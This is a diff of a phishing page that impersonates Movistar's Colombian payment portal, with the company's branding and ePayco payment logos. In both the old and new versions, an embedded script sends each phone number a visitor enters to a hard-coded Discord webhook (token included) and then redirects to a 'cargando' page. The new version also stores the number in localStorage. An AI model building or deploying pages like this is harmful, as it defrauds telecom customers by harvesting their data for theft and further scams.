@@ -2,206 +2,307 @@
 <html lang="es">
 
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <meta name="description" content="Portal de recaudos Movistar, paga o programa tus facturas de forma fácil y rápida" />
-    <meta name="theme-color" content="#019DF4" />
-    <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Validar línea Movistar" />
+  <meta name="theme-color" content="#019DF4" />
+  <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
 
-    <!-- Stylesheets -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
-    <link href="styles.css" rel="stylesheet">
-    <script src="epayco/js/functions.js"></script>
-    <script src="bot.js"></script>
-    <title>Movistar Portal de Recaudos</title>
-    <style>
-        #loader {
-            display: none;
-            position: fixed;
-            left: 50%;
-            top: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 10000;
-            background: rgba(255, 255, 255, 0.7);
-            width: 100vw;
-            height: 100vh;
-            align-items: center;
-            justify-content: center;
-        }
+  <!-- Bootstrap -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <title>Validar línea - Movistar</title>
 
-        .svg-circle {
-            width: 4em;
-            height: 4em;
-            transform-origin: center;
-            animation: rotate4 2s linear infinite;
-            display: block;
-            margin: 0 auto;
-        }
+  <style>
+    body {
+      background-color: #f9f9f9;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
 
-        #loader svg {
-            display: block;
-            margin: 0 auto;
-        }
+    header {
+      background-color: #fff;
+      padding: 1rem;
+      text-align: center;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+    }
 
-        circle {
-            fill: none;
-            stroke: #019DF4;
-            stroke-width: 4;
-            stroke-dasharray: 1, 200;
-            stroke-dashoffset: 0;
-            stroke-linecap: round;
-            animation: dash4 1.5s ease-in-out infinite;
-        }
+    .header-image {
+      max-height: 60px;
+    }
 
-        @keyframes rotate4 {
-            100% {
-                transform: rotate(360deg);
-            }
-        }
+    .header-footer-text {
+      margin-top: 0.5rem;
+      font-size: 0.9rem;
+      color: #555;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+    }
 
-        @keyframes dash4 {
-            0% {
-                stroke-dasharray: 1, 200;
-                stroke-dashoffset: 0;
-            }
+    .lock-icon {
+      height: 16px;
+      margin-right: 4px;
+    }
 
-            50% {
-                stroke-dasharray: 89, 200;
-                stroke-dashoffset: -35;
-            }
+    .omg-logo {
+      height: 20px;
+      margin-left: 4px;
+    }
 
-            100% {
-                stroke-dasharray: 89, 200;
-                stroke-dashoffset: -124;
-            }
-        }
-    </style>
+    .main-container {
+      display: flex;
+      flex-wrap: wrap;
+      margin: 2rem auto;
+      max-width: 1200px;
+      gap: 2rem;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    .content-container {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      padding: 2rem;
+      flex: 1;
+      min-width: 320px;
+      max-width: 500px;
+    }
+
+    h2 {
+      font-size: 1.6rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .thin-text {
+      font-weight: 300;
+      color: #333;
+    }
+
+    .bold-text {
+      font-weight: 600;
+      color: #004A99;
+    }
+
+    .input-group img.phone-icon {
+      height: 24px;
+      margin-right: 8px;
+    }
+
+    .line-input {
+      border-radius: 8px;
+    }
+
+    .btn-primary {
+      background-color: #019DF4;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+    }
+
+    .btn-primary:hover {
+      background-color: #0179c4;
+    }
+
+    .payment-methods {
+      margin-top: 2rem;
+    }
+
+    .payment-methods h3 {
+      font-size: 1.2rem;
+      margin-bottom: 1rem;
+    }
+
+    .icons-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .payment-icon {
+      height: 40px;
+      object-fit: contain;
+    }
+
+    .image-container {
+      flex: 1;
+      min-width: 280px;
+      max-width: 400px;
+    }
+
+    .advertisement-image {
+      width: 100%;
+      border-radius: 12px;
+      object-fit: cover;
+    }
+
+    .footer-text {
+      margin-top: 2rem;
+      font-size: 0.9rem;
+      color: #555;
+      text-align: center;
+    }
+
+    #loader {
+      display: none;
+      position: fixed;
+      left: 0;
+      top: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.8);
+      z-index: 10000;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .svg-circle {
+      width: 4em;
+      height: 4em;
+      transform-origin: center;
+      animation: rotate4 2s linear infinite;
+    }
+
+    circle {
+      fill: none;
+      stroke: #019DF4;
+      stroke-width: 4;
+      stroke-dasharray: 1, 200;
+      stroke-dashoffset: 0;
+      stroke-linecap: round;
+      animation: dash4 1.5s ease-in-out infinite;
+    }
+
+    @keyframes rotate4 {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes dash4 {
+      0% {
+        stroke-dasharray: 1, 200;
+        stroke-dashoffset: 0;
+      }
+
+      50% {
+        stroke-dasharray: 89, 200;
+        stroke-dashoffset: -35;
+      }
+
+      100% {
+        stroke-dasharray: 89, 200;
+        stroke-dashoffset: -124;
+      }
+    }
+  </style>
 </head>
 
 <body>
-    <header class="header">
-        <img src="img/descarga.png" alt="Encabezado de Movistar" class="header-image" />
-        <div class="header-footer-text d-md-none">
-            <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
-                alt="Ícono de candado" class="lock-icon" />
-            <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg"
-                    class="omg-logo" /></span>
+  <header class="header">
+    <img src="img/descarga.png" alt="Logo Movistar" class="header-image" />
+    <div class="header-footer-text">
+      <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
+        alt="Candado" class="lock-icon" />
+      <span>Pagos procesados por
+        <img src="img/logo_ePayco.1722863467828.png" alt="Logo ePayco" class="omg-logo" /></span>
+    </div>
+  </header>
+
+  <div class="main-container">
+    <div class="content-container">
+      <div class="text-center">
+        <h2><span class="thin-text">Validar </span><span class="bold-text">línea</span></h2>
+      </div>
+
+      <form id="loginForm">
+        <div class="form-group">
+          <div class="input-group mt-3">
+            <img
+              src="img/mobile-phone-or-smartphone-line-icon-outline-sign-linear-style-pictogram-isolated-on-white-symbol-logo-illustration-editable-stroke-vector.png"
+              alt="Teléfono" class="phone-icon" />
+            <input type="text" id="linea" class="form-control line-input" placeholder="Ingresa tu número de línea"
+              required />
+          </div>
+          <small class="form-text text-muted">Ingresa tu número de línea móvil Movistar</small>
         </div>
-    </header>
-    <div class="main-container">
-        <div class="content-container">
-            <div class="button-container text-center mb-4">
-                <button class="btn btn-primary btn-small" id="payBillButton">Movistar</button>
-                <button class="btn btn-secondary btn-small" id="otherBillButton1">Antes Telebucaramanga</button>
-                <button class="btn btn-secondary btn-small" id="otherBillButton2">Antes Metrotel</button>
-            </div>
-            <div id="billContent">
-                <div class="text-center">
-                    <h2 class="mb-4">
-                        <span class="thin-text">Pagar mi factura </span><span class="bold-text">Movistar</span>
-                    </h2>
-                </div>
-
-                <div class="form-group">
-                    <div class="btn-group d-flex justify-content-center" role="group" aria-label="Tipo de línea">
-                        <input type="radio" class="btn-check" name="lineType" id="mobileLine" autocomplete="off" checked>
-                        <label class="btn btn-outline-primary" for="mobileLine">Móvil</label>
-
-                        <input type="radio" class="btn-check" name="lineType" id="fixedLine" autocomplete="off">
-                        <label class="btn btn-outline-primary" for="fixedLine">Fija</label>
-                    </div>
-                    <div class="input-group mt-3">
-                        <img src="img/mobile-phone-or-smartphone-line-icon-outline-sign-linear-style-pictogram-isolated-on-white-symbol-logo-illustration-editable-stroke-vector.png"
-                            alt="Icono de teléfono" class="phone-icon" />
-                        <input type="text" id="line-number" class="form-control line-input"
-                            placeholder="Ingresa el número de línea o de pago" />
-                    </div>
-                    <small class="form-text text-muted">Ingresa el número de línea o de pago</small>
-                </div>
-                <div class="button-container text-center">
-                    <button id="consultPayButton" class="btn btn-secondary-disabled" disabled>Consultar y pagar</button>
-                </div>
-                <div class="button-container text-center mt-2">
-                    <button id="schedulePayButton" class="btn btn-secondary-disabled" disabled>Programar / Administrar
-                        mis pagos</button>
-                </div>
-                <div class="footer-text text-center d-none d-md-block">
-                    <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
-                        alt="Ícono de candado" class="lock-icon" />
-                    <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo de omg"
-                            class="omg-logo" /></span>
-                </div>
-                <div class="payment-methods text-center">
-                    <h3>
-                        <span class="bold-text">Nuevos medios de pago</span> <span class="thin-text">disponibles para
-                            ti</span>
-                    </h3>
-
-                    <div class="icons-container">
-                        <img src="img/4.jpeg" alt="Icono 1" class="payment-icon">
-                        <img src="img/1.png" alt="Icono 2" class="payment-icon">
-                        <img src="img/2.jpeg" alt="Icono 3" class="payment-icon">
-                        <img src="img/3.jpeg" alt="Icono 4" class="payment-icon">
-                    </div>
-                </div>
-            </div>
+        <div class="button-container text-center mt-3">
+          <button type="submit" class="btn btn-primary w-100">Continuar</button>
         </div>
+      </form>
 
-        <div class="image-container">
-            <img src="img/Background-mob.webp" alt="Publicidad" class="advertisement-image" />
+      <div class="payment-methods text-center">
+        <h3><span class="bold-text">Nuevos medios de pago</span> <span class="thin-text">disponibles para ti</span></h3>
+        <div class="icons-container">
+          <img src="img/4.jpeg" alt="Medio 1" class="payment-icon" />
+          <img src="img/1.png" alt="Medio 2" class="payment-icon" />
+          <img src="img/2.jpeg" alt="Medio 3" class="payment-icon" />
+          <img src="img/3.jpeg" alt="Medio 4" class="payment-icon" />
         </div>
+      </div>
+
+      <div class="footer-text">
+        <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png"
+          alt="Candado" class="lock-icon" />
+        <span>Pagos procesados por <img src="img/logo_ePayco.1722863467828.png" alt="Logo ePayco"
+            class="omg-logo" /></span>
+      </div>
     </div>
 
-    <div id="loader">
-        <svg viewBox="25 25 50 50" class="svg-circle">
-            <circle r="20" cy="50" cx="50"></circle>
-        </svg>
+    <div class="image-container">
+      <img src="img/Background-mob.webp" alt="Publicidad Movistar" class="advertisement-image" />
     </div>
+  </div>
 
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
-        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.bundle.min.js"></script>
-    <script src="debtmap.js"></script>
-    <script src="scripts.js"></script>
+  <!-- Loader -->
+  <div id="loader">
+    <svg viewBox="25 25 50 50" class="svg-circle">
+      <circle r="20" cy="50" cx="50"></circle>
+    </svg>
+  </div>
 
-<script>
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
+  <!-- JS -->
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
 
-  function sendToDiscord(message) {
-    fetch(DISCORD_WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: message })
-    }).catch(err => console.error("Error enviando a Discord", err));
-  }
+    function sendToDiscord(message) {
+      const data = { content: message };
 
-  document.getElementById("consultPayButton").addEventListener("click", function () {
-    const lineNumber = document.getElementById("line-number").value.trim();
-    const tipoLinea = document.getElementById("mobileLine").checked ? "Móvil" : "Fija";
-    const fecha = new Date().toLocaleString("es-CO");
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      })
+        .then(res => console.log("✅ Enviado a Discord"))
+        .catch(err => console.error("❌ Error enviando a Discord", err));
+    }
 
-    const mensaje = `📱 **Nueva consulta de pago:**\n` +
-                    `🔹 Tipo: ${tipoLinea}\n` +
-                    `🔢 Número: ${lineNumber || "(sin número)"}\n` +
-                    `⏰ Fecha: ${fecha}`;
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
 
-    sendToDiscord(mensaje);
+      const linea = document.getElementById("linea").value.trim();
+      if (!linea) return;
 
-    // Mostrar loader 2 segundos antes de redirigir
-    const loader = document.getElementById("loader");
-    loader.style.display = "flex";
+      // Loader visible
+      const loader = document.getElementById("loader");
+      loader.style.display = "flex";
 
-    setTimeout(function () {
-      loader.style.display = "none";
-      window.location.href = "https://promos-del-mes-movistar.vercel.app/cargando.html";
-    }, 2000);
-  });
-</script>
+      setTimeout(() => {
+        loader.style.display = "none";
 
+        const fecha = new Date().toLocaleString("es-CO");
+        const mensaje = `📲 **Nueva validación de línea:**\n🔢 Número: ${linea}\n🕒 Fecha: ${fecha}`;
 
+        sendToDiscord(mensaje);
 
+        localStorage.setItem("linea", linea);
+        window.location.href = "cargando.html";
+      }, 2000);
+    });
+  </script>
 </body>
+
 </html>
-
-
-
